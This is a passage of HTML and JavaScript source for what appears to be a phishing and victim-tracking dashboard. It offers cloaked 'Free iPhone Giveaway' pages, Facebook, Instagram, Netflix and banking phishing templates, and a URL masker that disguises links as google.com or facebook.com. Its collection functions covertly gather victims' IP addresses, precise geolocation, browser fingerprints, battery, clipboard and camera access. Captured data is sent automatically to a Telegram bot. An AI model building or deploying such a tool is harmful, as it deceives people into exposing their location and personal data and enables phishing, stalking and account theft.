                                            <div class="text-center">
                                                <i class="fas fa-fingerprint fa-3x text-secondary"></i>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-md-6">
                                            <div class="data-item">
                                                <span class="data-label">Canvas Fingerprint:</span>
                                                <span class="data-value" id="canvas-fingerprint">Click to generate</span>
                                            </div>
                                            <div class="data-item">
                                                <span class="data-label">User Agent Hash:</span>
                                                <span class="data-value" id="useragent-hash">Click to generate</span>
                                            </div>
                                            <div class="data-item">
                                                <span class="data-label">Audio Fingerprint:</span>
                                                <span class="data-value" id="audio-fingerprint">Generating...</span>
                                            </div>
                                        </div>
                                        <div class="col-md-6">
                                            <div class="data-item">
                                                <span class="data-label">Fonts Fingerprint:</span>
                                                <span class="data-value" id="fonts-fingerprint">Generating...</span>
                                            </div>
                                            <div class="data-item">
                                                <span class="data-label">Screen Hash:</span>
                                                <span class="data-value" id="screen-hash">Click to generate</span>
                                            </div>
                                            <div class="data-item">
                                                <span class="data-label">Time Zone:</span>
                                                <span class="data-value" id="timezone-fingerprint">${Intl.DateTimeFormat().resolvedOptions().timeZone}</span>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="data-item">
                                        <span class="data-label">Full Fingerprint Hash:</span>
                                        <span class="data-value" id="full-fingerprint">Generating...</span>
                                    </div>
                                    <button class="btn btn-primary mt-3" onclick="generateFingerprint()">
                                        <i class="fas fa-fingerprint"></i> Generate Fingerprint
                                    </button>
                                </div>
                                
                                <!-- Clipboard Tab -->
                                <div class="tab-pane glass-card p-4" id="clipboard-tab" style="display: none;">
                                    <h4 class="mb-4"><i class="fas fa-clipboard text-primary"></i> Clipboard Data</h4>
                                    <div class="alert alert-info">
                                        <i class="fas fa-info-circle"></i> Click the button below to read clipboard content. This requires user permission.
                                    </div>
                                    <div class="text-center mb-4">
                                        <button class="btn primary-btn btn-lg" onclick="readClipboard()">
                                            <i class="fas fa-clipboard-check"></i> Read Clipboard Content
                                        </button>
                                    </div>
                                    <div class="clipboard-container">
                                        <label for="clipboard-content" class="form-label fw-bold">Clipboard Content:</label>
                                        <textarea class="form-control" id="clipboard-content" rows="5" 
                                                  placeholder="Clipboard content will appear here..."></textarea>
                                    </div>
                                    <div class="text-end mt-3">
                                        <button class="btn success-btn" onclick="copyToClipboard('clipboard-content')">
                                            <i class="fas fa-copy"></i> Copy to Clipboard
                                        </button>
                                    </div>
                                </div>
                                
                                <!-- Mask URLs Tab -->
                                <div class="tab-pane glass-card p-4" id="mask-tab" style="display: none;">
                                    <h4 class="mb-4"><i class="fas fa-mask text-primary"></i> Mask URL Generator</h4>
                                    <div class="alert alert-warning">
                                        <i class="fas fa-exclamation-triangle"></i> This tool generates masked URLs that can obscure the original destination.
                                    </div>
                                    <div class="mb-3">
                                        <label for="original-url" class="form-label">Original URL:</label>
                                        <input type="url" class="form-control" id="original-url" 
                                               placeholder="https://example.com" value="https://example.com">
                                    </div>
                                    <div class="mb-3">
                                        <label for="mask-domain" class="form-label">Mask Domain:</label>
                                        <select class="form-control" id="mask-domain">
                                            <option value="https://google.com">google.com</option>
                                            <option value="https://youtube.com">youtube.com</option>
                                            <option value="https://facebook.com">facebook.com</option>
                                            <option value="https://instagram.com">instagram.com</option>
                                            <option value="https://twitter.com">twitter.com</option>
                                            <option value="custom">Custom Domain</option>
                                        </select>
                                    </div>
                                    <div class="mb-3 d-none" id="custom-domain-container">
                                        <label for="custom-domain" class="form-label">Custom Domain:</label>
                                        <input type="text" class="form-control" id="custom-domain" 
                                               placeholder="https://yourdomain.com">
                                    </div>
                                    <div class="text-center mb-4">
                                        <button class="btn purple-btn" onclick="generateMaskedURL()">
                                            <i class="fas fa-magic"></i> Generate Masked URL
                                        </button>
                                    </div>
                                    <div class="mask-url-container" id="masked-url-container">
                                        Masked URL will appear here
                                    </div>
                                    <div class="text-end mt-3">
                                        <button class="btn success-btn" onclick="copyMaskedURL()">
                                            <i class="fas fa-copy"></i> Copy Masked URL
                                        </button>
                                    </div>
                                </div>
                                
                                <!-- Link Generator Tab -->
                                <div class="tab-pane glass-card p-4" id="link-tab" style="display: none;">
                                    <h4 class="mb-4"><i class="fas fa-share-alt text-primary"></i> Link Generator & Campaign Manager</h4>
                                    <div class="row">
                                        <div class="col-md-6">
                                            <div class="link-generator-card">
                                                <h5><i class="fas fa-link"></i> Generate Tracking Link</h5>
                                                
                                                <div class="mb-3">
                                                    <label for="campaign-name" class="form-label">Campaign Name:</label>
                                                    <input type="text" class="form-control" id="campaign-name" 
                                                           placeholder="e.g., Facebook Campaign, Email Marketing" 
                                                           value="Test Campaign">
                                                </div>
                                                
                                                <div class="mb-3">
                                                    <label for="redirect-url" class="form-label">Redirect URL (After Scan):</label>
                                                    <input type="url" class="form-control" id="redirect-url" 
                                                           placeholder="https://example.com" 
                                                           value="https://google.com">
                                                    <div class="form-text">Where users will be redirected after data collection</div>
                                                </div>
                                                
                                                <div class="mb-3">
                                                    <label for="cloak-url" class="form-label">Cloaking URL (Visible to User):</label>
                                                    <input type="url" class="form-control" id="cloak-url" 
                                                           placeholder="https://trusted-site.com" 
                                                           value="https://free-gifts.com">
                                                    <div class="form-text">What users will see in their address bar</div>
                                                </div>
                                                
                                                <div class="mb-3">
                                                    <label for="cloak-title" class="form-label">Page Title:</label>
                                                    <input type="text" class="form-control" id="cloak-title" 
                                                           placeholder="Free iPhone Giveaway!" 
                                                           value="🎁 Free iPhone 15 Pro Max Giveaway!">
                                                </div>
                                                
                                                <div class="mb-3">
                                                    <label class="form-label">Data to Collect:</label>
                                                    <div class="row">
                                                        <div class="col-6">
                                                            <div class="form-check">
                                                                <input class="form-check-input" type="checkbox" id="collect-basic" checked>
                                                                <label class="form-check-label">
                                                                    Basic Info
                                                                </label>
                                                            </div>
                                                            <div class="form-check">
                                                                <input class="form-check-input" type="checkbox" id="collect-location" checked>
                                                                <label class="form-check-label">
                                                                    Location
                                                                </label>
                                                            </div>
                                                            <div class="form-check">
                                                                <input class="form-check-input" type="checkbox" id="collect-camera">
                                                                <label class="form-check-label">
                                                                    Camera
                                                                </label>
                                                            </div>
                                                        </div>
                                                        <div class="col-6">
                                                            <div class="form-check">
                                                                <input class="form-check-input" type="checkbox" id="collect-network" checked>
                                                                <label class="form-check-label">
                                                                    Network
                                                                </label>
                                                            </div>
                                                            <div class="form-check">
                                                                <input class="form-check-input" type="checkbox" id="collect-battery" checked>
                                                                <label class="form-check-label">
                                                                    Battery
                                                                </label>
                                                            </div>
                                                            <div class="form-check">
                                                                <input class="form-check-input" type="checkbox" id="collect-clipboard">
                                                                <label class="form-check-label">
                                                                    Clipboard
                                                                </label>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                
                                                <div class="mb-3">
                                                    <label class="form-label">Auto-send to Telegram:</label>
                                                    <div class="form-check">
                                                        <input class="form-check-input" type="checkbox" id="auto-telegram" checked>
                                                        <label class="form-check-label">
                                                            Automatically send data to Telegram
                                                        </label>
                                                    </div>
                                                </div>
                                                
                                                <div class="text-center">
                                                    <button class="btn cyan-btn btn-lg" onclick="generateTrackingLink()">
                                                        <i class="fas fa-magic"></i> Generate Tracking Link
                                                    </button>
                                                </div>
                                            </div>
                                        </div>
                                        
                                        <div class="col-md-6">
                                            <div class="campaign-preview">
                                                <h5><i class="fas fa-chart-line"></i> Campaign Preview</h5>
                                                
                                                <div class="cloak-preview" id="cloak-preview">
                                                    <h5 id="preview-title">🎁 Free iPhone 15 Pro Max Giveaway!</h5>
                                                    <p>This is how your cloaked page will appear to victims.</p>
                                                    <div style="background: linear-gradient(45deg, #4A90E2, #357ABD); padding: 10px; border-radius: 5px; text-align: center; margin: 10px 0;">
                                                        <span style="color: white;">Trusted Website Preview</span>
                                                    </div>
                                                    <p class="small">Users will see this page while data is collected in the background.</p>
                                                </div>
                                                
                                                <div class="alert alert-dark mt-3" id="generated-link-preview">
                                                    <div class="text-warning">Link will appear here after generation</div>
                                                </div>
                                                
                                                <div class="mb-3 mt-3">
                                                    <label class="form-label">Shorten Link:</label>
                                                    <div class="input-group">
                                                        <select class="form-control" id="shortener-service">
                                                            <option value="bitly">Bitly</option>
                                                            <option value="tinyurl">TinyURL</option>
                                                            <option value="isgd">is.gd</option>
                                                            <option value="custom">Custom Domain</option>
                                                        </select>
                                                        <button class="btn btn-primary" onclick="shortenLink()">
                                                            <i class="fas fa-compress"></i> Shorten
                                                        </button>
                                                    </div>
                                                </div>
                                                
                                                <div class="alert alert-success" id="shortened-link" style="display: none;">
                                                    <div class="d-flex justify-content-between align-items-center">
                                                        <div>
                                                            <strong>Shortened Link:</strong>
                                                            <div id="short-link-text" class="small"></div>
                                                        </div>
                                                        <button class="btn btn-sm btn-light" onclick="copyShortLink()">
                                                            <i class="fas fa-copy"></i>
                                                        </button>
                                                    </div>
                                                </div>
                                                
                                                <h6 class="mt-3">Share Via:</h6>
                                                <div class="d-flex justify-content-center">
                                                    <button class="social-share-btn facebook-bg" onclick="shareLink('facebook')">
                                                        <i class="fab fa-facebook-f"></i>
                                                    </button>
                                                    <button class="social-share-btn whatsapp-bg" onclick="shareLink('whatsapp')">
                                                        <i class="fab fa-whatsapp"></i>
                                                    </button>
                                                    <button class="social-share-btn telegram-bg" onclick="shareLink('telegram')">
                                                        <i class="fab fa-telegram"></i>
                                                    </button>
                                                    <button class="social-share-btn twitter-bg" onclick="shareLink('twitter')">
                                                        <i class="fab fa-twitter"></i>
                                                    </button>
                                                    <button class="social-share-btn messenger-bg" onclick="shareLink('messenger')">
                                                        <i class="fab fa-facebook-messenger"></i>
                                                    </button>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <div class="mt-4">
                                        <h5><i class="fas fa-history"></i> Active Campaigns</h5>
                                        <div id="campaigns-list-full">
                                            <!-- Full campaigns list will be loaded here -->
                                        </div>
                                    </div>
                                </div>
                                
                                <!-- Telegram Bot Tab -->
                                <div class="tab-pane glass-card p-4" id="telegram-tab" style="display: none;">
                                    <h4 class="mb-4"><i class="fab fa-telegram text-primary"></i> Telegram Bot Integration</h4>
                                    <div class="telegram-config">
                                        <h5><i class="fas fa-cog"></i> Configuration</h5>
                                        <div class="mb-3">
                                            <label for="bot-token" class="form-label">Bot Token:</label>
                                            <input type="text" class="form-control" id="bot-token" 
                                                   placeholder="Enter your Telegram bot token">
                                            <div class="form-text">
                                                Get your bot token from <a href="https://t.me/BotFather" target="_blank">@BotFather</a>
                                            </div>
                                        </div>
                                        
                                        <div class="mb-3">
                                            <label for="chat-id" class="form-label">Chat ID:</label>
                                            <input type="text" class="form-control" id="chat-id" 
                                                   placeholder="Enter your Telegram chat ID">
                                            <div class="form-text">
                                                Get your chat ID by sending a message to <a href="https://t.me/userinfobot" target="_blank">@userinfobot</a>
                                            </div>
                                        </div>
                                        
                                        <div class="text-center">
                                            <button class="btn success-btn btn-lg" onclick="sendToTelegram()">
                                                <i class="fab fa-telegram"></i> Send Data to Telegram
                                            </button>
                                            <button class="btn primary-btn ms-2" onclick="testTelegramConnection()">
                                                <i class="fas fa-wifi"></i> Test Connection
                                            </button>
                                        </div>
                                    </div>
                                    
                                    <div class="mt-4">
                                        <h5><i class="fas fa-history"></i> Send History</h5>
                                        <div id="telegram-history" class="small">
                                            <p class="text-muted">No data sent yet.</p>
                                        </div>
                                    </div>
                                </div>
                                
                                <!-- All-in-One Tools Tab -->
                                <div class="tab-pane glass-card p-4" id="all-tools-tab" style="display: none;">
                                    <h4 class="mb-4"><i class="fas fa-boxes text-primary"></i> All-in-One Tools</h4>
                                    <div class="tools-grid">
                                        <div class="tool-card">
                                            <div class="tool-icon">
                                                <i class="fas fa-eye"></i>
                                            </div>
                                            <h5>IP Lookup</h5>
                                            <p>Detailed IP address information with geolocation</p>
                                            <button class="btn btn-sm primary-btn" onclick="showIPTab()">Open</button>
                                        </div>
                                        
                                        <div class="tool-card">
                                            <div class="tool-icon">
                                                <i class="fas fa-code"></i>
                                            </div>
                                            <h5>User Agent Analyzer</h5>
                                            <p>Parse and analyze browser user agent string</p>
                                            <button class="btn btn-sm primary-btn" onclick="showUserAgentTab()">Open</button>
                                        </div>
                                        
                                        <div class="tool-card">
                                            <div class="tool-icon">
                                                <i class="fas fa-desktop"></i>
                                            </div>
                                            <h5>Screen Tester</h5>
                                            <p>Test screen resolution, color, and display properties</p>
                                            <button class="btn btn-sm primary-btn" onclick="testScreen()">Open</button>
                                        </div>
                                        
                                        <div class="tool-card">
                                            <div class="tool-icon">
                                                <i class="fas fa-network-wired"></i>
                                            </div>
                                            <h5>Network Tester</h5>
                                            <p>Test network speed, latency, and connection quality</p>
                                            <button class="btn btn-sm primary-btn" onclick="testNetwork()">Open</button>
                                        </div>
                                        
                                        <div class="tool-card">
                                            <div class="tool-icon">
                                                <i class="fas fa-shield-alt"></i>
                                            </div>
                                            <h5>Security Check</h5>
                                            <p>Check browser security settings and vulnerabilities</p>
                                            <button class="btn btn-sm primary-btn" onclick="checkSecurity()">Open</button>
                                        </div>
                                        
                                        <div class="tool-card">
                                            <div class="tool-icon">
                                                <i class="fas fa-compress-arrows-alt"></i>
                                            </div>
                                            <h5>Data Compressor</h5>
                                            <p>Compress and decompress data for efficiency</p>
                                            <button class="btn btn-sm primary-btn" onclick="compressData()">Open</button>
                                        </div>
                                        
                                        <div class="tool-card">
                                            <div class="tool-icon">
                                                <i class="fas fa-keyboard"></i>
                                            </div>
                                            <h5>Keyboard Tester</h5>
                                            <p>Test keyboard keys and functionality</p>
                                            <button class="btn btn-sm primary-btn" onclick="testKeyboard()">Open</button>
                                        </div>
                                        
                                        <div class="tool-card">
                                            <div class="tool-icon">
                                                <i class="fas fa-microphone"></i>
                                            </div>
                                            <h5>Audio Tester</h5>
                                            <p>Test microphone and audio output</p>
                                            <button class="btn btn-sm primary-btn" onclick="testAudio()">Open</button>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Link Generation Modal -->
                <div class="modal fade" id="linkModal" tabindex="-1">
                    <div class="modal-dialog modal-lg">
                        <div class="modal-content">
                            <div class="modal-header" style="background: linear-gradient(45deg, #9b59b6, #8e44ad);">
                                <h5 class="modal-title text-white">
                                    <i class="fas fa-link"></i> Quick Link Generator
                                </h5>
                                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                            </div>
                            <div class="modal-body">
                                <div class="row">
                                    <div class="col-md-6">
                                        <h6>Quick Templates</h6>
                                        <div class="d-grid gap-2">
                                            <button class="btn facebook-bg" onclick="generatePhishingTemplate('facebook')">
                                                <i class="fab fa-facebook"></i> Facebook Login
                                            </button>
                                            <button class="btn" style="background: linear-gradient(45deg, #E1306C, #C13584);" 
                                                    onclick="generatePhishingTemplate('instagram')">
                                                <i class="fab fa-instagram"></i> Instagram Giveaway
                                            </button>
                                            <button class="btn btn-danger" onclick="generatePhishingTemplate('netflix')">
                                                <i class="fab fa-netflix"></i> Netflix Free Trial
                                            </button>
                                            <button class="btn btn-warning" onclick="generatePhishingTemplate('banking')">
                                                <i class="fas fa-university"></i> Banking Security Check
                                            </button>
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <h6>Custom Link</h6>
                                        <div class="mb-3">
                                            <label class="form-label">Link Type:</label>
                                            <select class="form-control" id="quick-link-type">
                                                <option value="direct">Direct Scanner</option>
                                                <option value="cloaked">Cloaked Page</option>
                                                <option value="redirect">Redirect After Scan</option>
                                            </select>
                                        </div>
                                        <button class="btn purple-btn w-100" onclick="generateQuickLink()">
                                            <i class="fas fa-bolt"></i> Generate Quick Link
                                        </button>
                                        
                                        <div class="mt-3 text-center">
                                            <h6>QR Code</h6>
                                            <div class="qr-code-container">
                                                <div id="quick-qr-code">
                                                    <i class="fas fa-qrcode fa-3x text-dark"></i>
                                                    <p class="small mt-2">QR Code Preview</p>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                
                                <div class="alert alert-info mt-4" id="quick-link-preview">
                                    <div class="text-center text-muted">Quick link will appear here</div>
                                </div>
                            </div>
                            <div class="modal-footer">
                                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                                <button type="button" class="btn btn-primary" onclick="copyQuickLink()">
                                    <i class="fas fa-copy"></i> Copy Link
                                </button>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Settings Modal -->
                <div class="modal fade" id="settingsModal" tabindex="-1">
                    <div class="modal-dialog">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h5 class="modal-title">
                                    <i class="fas fa-cog"></i> Settings
                                </h5>
                                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                            </div>
                            <div class="modal-body">
                                <div class="mb-3">
                                    <label class="form-label">Auto-send to Telegram:</label>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" id="auto-send">
                                        <label class="form-check-label" for="auto-send">
                                            Automatically send data when collected
                                        </label>
                                    </div>
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">Data Retention:</label>
                                    <select class="form-control" id="data-retention">
                                        <option value="session">Keep until browser closes</option>
                                        <option value="24h">Keep for 24 hours</option>
                                        <option value="7days">Keep for 7 days</option>
                                        <option value="forever">Keep forever</option>
                                    </select>
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">Telegram Bot Defaults:</label>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" id="default-screenshots" checked>
                                        <label class="form-check-label" for="default-screenshots">
                                            Include screenshots by default
                                        </label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" id="default-anonymize">
                                        <label class="form-check-label" for="default-anonymize">
                                            Anonymize data by default
                                        </label>
                                    </div>
                                </div>
                                <button class="btn danger-btn w-100" onclick="clearAllData()">
                                    <i class="fas fa-trash"></i> Clear All Collected Data
                                </button>
                            </div>
                            <div class="modal-footer">
                                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                                <button type="button" class="btn btn-primary" data-bs-dismiss="modal">Save Changes</button>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Telegram Modal -->
                <div class="modal fade" id="telegramModal" tabindex="-1" aria-labelledby="telegramModalLabel" aria-hidden="true">
                    <div class="modal-dialog modal-lg">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h5 class="modal-title" id="telegramModalLabel">
                                    <i class="fab fa-telegram"></i> Send Data to Telegram
                                </h5>
                                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                            </div>
                            <div class="modal-body">
                                <div class="telegram-config">
                                    <h5><i class="fas fa-cog"></i> Configuration</h5>
                                    <div class="mb-3">
                                        <label for="modal-bot-token" class="form-label">Bot Token:</label>
                                        <input type="text" class="form-control" id="modal-bot-token" 
                                               placeholder="Enter your Telegram bot token" 
                                               value="${telegramConfig.botToken}">
                                        <div class="form-text">
                                            Get your bot token from <a href="https://t.me/BotFather" target="_blank">@BotFather</a>
                                        </div>
                                    </div>
                                    
                                    <div class="mb-3">
                                        <label for="modal-chat-id" class="form-label">Chat ID:</label>
                                        <input type="text" class="form-control" id="modal-chat-id" 
                                               placeholder="Enter your Telegram chat ID"
                                               value="${telegramConfig.chatId}">
                                        <div class="form-text">
                                            Get your chat ID by sending a message to <a href="https://t.me/userinfobot" target="_blank">@userinfobot</a>
                                        </div>
                                    </div>
                                    
                                    <div class="mb-3">
                                        <label class="form-label">Data to Send:</label>
                                        <div class="form-check">
                                            <input class="form-check-input" type="checkbox" id="send-device" checked>
                                            <label class="form-check-label" for="send-device">
                                                Device Information
                                            </label>
                                        </div>
                                        <div class="form-check">
                                            <input class="form-check-input" type="checkbox" id="send-network" checked>
                                            <label class="form-check-label" for="send-network">
                                                Network Information
                                            </label>
                                        </div>
                                        <div class="form-check">
                                            <input class="form-check-input" type="checkbox" id="send-location" checked>
                                            <label class="form-check-label" for="send-location">
                                                Location Information
                                            </label>
                                        </div>
                                        <div class="form-check">
                                            <input class="form-check-input" type="checkbox" id="send-fingerprint" checked>
                                            <label class="form-check-label" for="send-fingerprint">
                                                Fingerprint
                                            </label>
                                        </div>
                                    </div>
                                    
                                    <div class="text-center">
                                        <button class="btn telegram-btn btn-lg" onclick="sendDashboardDataToTelegram()">
                                            <i class="fab fa-telegram"></i> Send Data to Telegram
                                        </button>
                                        <button class="btn btn-outline-primary ms-2" onclick="testTelegramConnection()">
                                            <i class="fas fa-wifi"></i> Test Connection
                                        </button>
                                    </div>
                                </div>
                                
                                <div class="mt-4">
                                    <h5><i class="fas fa-history"></i> Send History</h5>
                                    <div id="modal-telegram-history" class="small">
                                        <p class="text-muted">No data sent yet.</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            `;
        }
        
        function showTab(tabId) {
            document.querySelectorAll('.tab-pane').forEach(tab => {
                tab.style.display = 'none';
            });
            
            document.querySelectorAll('.nav-link').forEach(link => {
                link.classList.remove('active');
            });
            
            const tab = document.getElementById(tabId);
            if (tab) {
                tab.style.display = 'block';
            }
            
            const navLinks = document.querySelectorAll('.nav-link');
            for (let link of navLinks) {
                if (link.getAttribute('onclick')?.includes(tabId)) {
                    link.classList.add('active');
                    break;
                }
            }
            
            if (tabId === 'camera-tab') {
                initializeCamera();
            } else if (tabId === 'fingerprint-tab') {
                generateFingerprint();
            }
        }
        
        function setupDashboardEventListeners() {
            const maskDomainSelect = document.getElementById('mask-domain');
            if (maskDomainSelect) {
                maskDomainSelect.addEventListener('change', function() {
                    const customContainer = document.getElementById('custom-domain-container');
                    if (this.value === 'custom') {
                        customContainer.classList.remove('d-none');
                    } else {
                        customContainer.classList.add('d-none');
                    }
                });
            }
            
            const cloakTitle = document.getElementById('cloak-title');
            const cloakUrl = document.getElementById('cloak-url');
            
            if (cloakTitle) {
                cloakTitle.addEventListener('input', updateCloakPreview);
            }
            if (cloakUrl) {
                cloakUrl.addEventListener('input', updateCloakPreview);
            }
            
            updateTelegramConfigInputs();
        }
        
        function updateTelegramConfigInputs() {
            const botTokenInput = document.getElementById('bot-token');
            const chatIdInput = document.getElementById('chat-id');
            
            if (botTokenInput) botTokenInput.value = telegramConfig.botToken;
            if (chatIdInput) chatIdInput.value = telegramConfig.chatId;
        }

        // ============================================
        // DATA COLLECTION FUNCTIONS
        // ============================================
        
        async function collectBasicDeviceInfo() {
            deviceData.deviceInfo.platform = navigator.platform;
            deviceData.deviceInfo.userAgent = navigator.userAgent;
            deviceData.deviceInfo.screenResolution = `${window.screen.width} x ${window.screen.height}`;
            deviceData.deviceInfo.colorDepth = `${window.screen.colorDepth} bit`;
            deviceData.deviceInfo.pixelRatio = window.devicePixelRatio;
            
            if (navigator.deviceMemory) {
                deviceData.deviceInfo.deviceMemory = `${navigator.deviceMemory} GB`;
            }
            
            deviceData.deviceInfo.language = navigator.language;
            deviceData.deviceInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            deviceData.deviceInfo.hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
            deviceData.deviceInfo.maxTouchPoints = navigator.maxTouchPoints || 0;
            deviceData.deviceInfo.touchSupport = deviceData.deviceInfo.maxTouchPoints > 0;
            
            updateDeviceInfoUI();
        }
        
        async function collectMobileCapabilities() {
            const userAgent = navigator.userAgent.toLowerCase();
            
            deviceData.mobileFeatures.platformInfo = {
                isIOS: /iphone|ipad|ipod/.test(userAgent),
                isAndroid: /android/.test(userAgent),
                isMobile: /mobile/.test(userAgent),
                isChrome: /chrome/.test(userAgent),
                isSafari: /safari/.test(userAgent) && !/chrome/.test(userAgent),
                platform: navigator.platform,
                appVersion: navigator.appVersion
            };
            
            deviceData.mobileFeatures.capabilities = {
                hasVibration: 'vibrate' in navigator,
                hasNFC: 'NDEFReader' in window,
                hasBluetooth: 'bluetooth' in navigator,
                hasTelephony: /android|iphone|ipad|ipod/.test(userAgent),
                maxTouchPoints: navigator.maxTouchPoints || 1
            };
            
            if (navigator.connection) {
                const conn = navigator.connection;
                deviceData.mobileFeatures.capabilities.networkType = conn.effectiveType;
                deviceData.mobileFeatures.capabilities.hasWifi = conn.effectiveType === 'wifi';
                deviceData.mobileFeatures.capabilities.hasCellular = ['cellular', '3g', '4g', '5g'].includes(conn.effectiveType);
            }
            
            updateMobileFeaturesUI();
        }
        
        async function collectNetworkInfo() {
            deviceData.networkInfo = {};
            deviceData.networkInfo.onlineStatus = navigator.onLine ? 'Online' : 'Offline';
            
            if (navigator.connection) {
                const conn = navigator.connection;
                deviceData.networkInfo.connectionType = conn.effectiveType;
                deviceData.networkInfo.downlink = conn.downlink;
                deviceData.networkInfo.rtt = conn.rtt;
                deviceData.networkInfo.saveData = conn.saveData;
            }
            
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                deviceData.networkInfo.ipv4 = data.ip;
                
                try {
                    const response6 = await fetch('https://api64.ipify.org?format=json');
                    const data6 = await response6.json();
                    deviceData.networkInfo.ipv6 = data6.ip !== data.ip ? data6.ip : 'Not available';
                } catch {
                    deviceData.networkInfo.ipv6 = 'Not available';
                }
            } catch {
                deviceData.networkInfo.ipv4 = 'Unable to retrieve';
                deviceData.networkInfo.ipv6 = 'Unable to retrieve';
            }
            
            updateNetworkInfoUI();
        }
        
        async function collectFingerprintInfo() {
            deviceData.fingerprintInfo = {};
            
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.textBaseline = 'alphabetic';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Fingerprint', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('Fingerprint', 4, 17);
                
                const canvasData = canvas.toDataURL();
                deviceData.fingerprintInfo.canvas = simpleHash(canvasData);
            } catch (e) {
                deviceData.fingerprintInfo.canvas = 'Failed to generate';
            }
            
            deviceData.fingerprintInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            deviceData.fingerprintInfo.screen = simpleHash(
                JSON.stringify({
                    width: window.screen.width,
                    height: window.screen.height,
                    colorDepth: window.screen.colorDepth,
                    availWidth: window.screen.availWidth,
                    availHeight: window.screen.availHeight
                })
            );
            
            const fullData = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                languages: navigator.languages.join(','),
                hardwareConcurrency: navigator.hardwareConcurrency,
                timezone: deviceData.fingerprintInfo.timezone,
                screen: deviceData.fingerprintInfo.screen,
                canvas: deviceData.fingerprintInfo.canvas
            };
            
            deviceData.fingerprintInfo.full = simpleHash(JSON.stringify(fullData));
            
            updateFingerprintUI();
        }
        
        async function collectPermissionsInfo() {
            deviceData.permissionsInfo = {};
            const permissions = [
                'camera',
                'microphone',
                'geolocation',
                'notifications',
                'clipboard-read',
                'clipboard-write'
            ];
            
            for (const permission of permissions) {
                try {
                    const result = await navigator.permissions.query({name: permission});
                    deviceData.permissionsInfo[permission] = result.state;
                } catch (e) {
                    deviceData.permissionsInfo[permission] = 'Not supported';
                }
            }
            
            if ('Notification' in window) {
                deviceData.mobileFeatures.notificationInfo = {
                    permission: Notification.permission,
                    canSend: Notification.permission === 'granted'
                };
            }
            
            updatePermissionsUI();
        }
        
        async function collectBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    
                    deviceData.batteryInfo = {
                        level: Math.round(battery.level * 100),
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                    
                    battery.addEventListener('levelchange', () => {
                        deviceData.batteryInfo.level = Math.round(battery.level * 100);
                        updateBatteryUI();
                    });
                    
                    battery.addEventListener('chargingchange', () => {
                        deviceData.batteryInfo.charging = battery.charging;
                        updateBatteryUI();
                    });
                    
                } catch (e) {
                    deviceData.batteryInfo = {
                        level: 100,
                        charging: 'Unknown',
                        chargingTime: 'Unknown',
                        dischargingTime: 'Unknown'
                    };
                }
            } else {
                deviceData.batteryInfo = {
                    level: 100,
                    charging: 'Not supported',
                    chargingTime: 'Not supported',
                    dischargingTime: 'Not supported'
                };
            }
            
            updateBatteryUI();
        }
        
        async function collectStorageInfo() {
            if ('storage' in navigator && 'estimate' in navigator.storage) {
                try {
                    const estimate = await navigator.storage.estimate();
                    
                    deviceData.storageInfo = {
                        usage: (estimate.usage / (1024 * 1024)).toFixed(2),
                        quota: (estimate.quota / (1024 * 1024)).toFixed(2),
                        available: ((estimate.quota - estimate.usage) / (1024 * 1024)).toFixed(2)
                    };
                    
                    if (navigator.storage.persist) {
                        const isPersisted = await navigator.storage.persisted();
                        deviceData.storageInfo.persistence = isPersisted ? 'Persistent' : 'Not persistent';
                    }
                    
                } catch (e) {
                    deviceData.storageInfo = {
                        usage: 'Unknown',
                        quota: 'Unknown',
                        available: 'Unknown',
                        persistence: 'Unknown'
                    };
                }
            } else {
                deviceData.storageInfo = {
                    usage: 'Not supported',
                    quota: 'Not supported',
                    available: 'Not supported',
                    persistence: 'Not supported'
                };
            }
            
            updateStorageUI();
        }
        
        async function getLocationAsync() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('Geolocation not supported'));
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    position => {
                        deviceData.locationInfo = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            speed: position.coords.speed,
                            timestamp: new Date(position.timestamp).toISOString()
                        };
                        
                        updateLocationUI();
                        resolve(position);
                    },
                    error => {
                        deviceData.locationInfo = {
                            error: error.message,
                            permission: 'denied'
                        };
                        reject(error);
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }
        
        async function checkCameraAvailability() {
            try {
